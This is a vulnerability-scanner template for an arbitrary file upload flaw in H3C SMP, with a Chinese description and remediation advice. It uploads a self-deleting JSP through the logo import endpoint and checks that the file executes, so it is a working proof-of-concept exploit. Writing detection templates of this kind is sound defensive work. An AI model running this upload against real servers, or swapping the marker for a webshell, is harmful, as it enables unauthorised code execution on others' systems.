id: h3c-smp-upload
info:
  name: H3C SMP - 任意文件上传漏洞
  author: Chaitin
  severity: high
  description: |
    该模板用于检测 H3C SMP - 任意文件上传漏洞。该类漏洞通常源于上传接口缺少文件类型、路径或执行权限控制，导致恶意文件可被写入服务器。模板主要向 `/third/cameraSecure/newFoundTerminals`、`/parameterSetting/importLogo` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可上传恶意脚本、WebShell 或伪装文件，进而执行代码或长期控制站点。
    - 若上传目录可被 Web 服务器解析，漏洞可能直接导致服务器失陷和业务数据泄露。
  remediation: |
    - 对上传文件执行扩展名、MIME、魔数和内容校验，并使用随机文件名保存到不可执行目录。
    - 禁止上传目录执行脚本，分离静态文件域名和应用执行环境。
    - 清理历史上传文件，排查 WebShell、异常访问日志和新增系统账号。
  metadata:
    verified: true
    max-request: 3
    vendor: h3c
    product: smp
  tags: fileupload,vuln,h3c,smp
variables:
  n1: '{{to_lower(rand_text_alpha(20))}}'
  n2: '{{to_lower(rand_text_alpha(20))}}'
  rboundary: '{{to_lower(rand_text_alpha(8))}}'
flow: http(1) && http(2) && http(3)
http:
  - method: GET
    path:
      - '{{BaseURL}}/third/cameraSecure/newFoundTerminals'
    redirects: false
    matchers:
      - type: dsl
        internal: true
        dsl:
          - 'status_code == 302'
  - method: POST
    path:
      - '{{BaseURL}}/parameterSetting/importLogo'
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
    body: |
      ------WebKitFormBoundary{{rboundary}}
      Content-Disposition: form-data; name="importFile"; filename="{{n1}}.jsp"
      Content-Type: application/octet-stream

      <%out.print("{{n2}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
      ------WebKitFormBoundary{{rboundary}}--
    matchers:
      - type: dsl
        internal: true
        dsl:
          - 'status_code == 200 && contains(body, "logoImg")'
  - method: GET
    path:
      - '{{BaseURL}}/uploadFiles/logoImg/{{n1}}.jsp'
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, n2)'
